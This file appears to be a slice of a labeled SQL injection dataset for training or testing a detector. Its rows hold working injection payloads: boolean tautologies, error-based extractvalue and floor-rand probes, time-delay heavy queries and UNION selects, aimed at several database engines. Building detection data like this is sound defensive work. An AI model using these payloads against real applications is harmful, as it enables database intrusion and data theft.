row_index,payload_norm,label,sqli_type_hint
960,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3-- ampw",1,
961,"1' in boolean mode ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) #",1,
962,1' ) where 2753 = 2753 and ( 2739 = 8047 ) *8047--,1,
963,1'+ ( select 'ljtl' where 1766 = 1766,1,
964,-3921' ) as audo where 7087 = 7087 or 1755 = 4937--,1,
965,"-2072"" ) as rjcz where 2491 = 2491 or 6872 = 6872--",1,
966,1' ) as llug where 2244 = 2244 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --,1,
967,"1' ) ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,
968,-7187' or 4159 = 7465,1,
969,"1' or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and 'ytlf' = 'ytlf",1,
970,"1"" ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( ""cdnc"" like ""cdnc",1,
971,select ( case when ( 3855 = 3855 ) then 3855 else 1/ ( select 0 ) end ) --,1,
972,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( 'dthp' = 'dthp",1,
973,"1"" and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ""tfok"" like ""tfok",1,
974,1' ) where 6622 = 6622 order by 1--,1,
975,"1' and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and 'kwhs' like 'kwhs",1,
976,"1' or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and 'rhzy' = 'rhzy",1,
977,"1'+ ( select 'yzxc' where 5230 = 5230 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) ) +'",1,
978,"1'+ ( select 'sbvh' where 8539 = 8539 and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) ) +'",1,
979,"-7813"" ) ) as yvyl where 5172 = 5172 union all select 5172,5172#",1,
980,1'|| ( select 'uiyj' from dual where 8320 = 8320,1,
981,select ( case when ( 4111 = 1992 ) then 4111 else 1/ ( select 0 ) end ) --,1,
982,"select count ( * ) from generate_series ( 1,5000000 ) and ""xcjt"" = ""xcjt",1,
983,"1 where 1096 = 1096 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) --",1,
984,"-9011"" ) ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1,
985,1' ) ) as plbt where 4368 = 4368 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --,1,
986,"1 ) and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )",1,
987,"1"" ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ""dppw"" like ""dppw",1,
988,1'|| ( select 'zyvk' from dual where 2072 = 2072,1,
989,-5918' ) as olzc where 5992 = 5992 or 4390 = 9085,1,
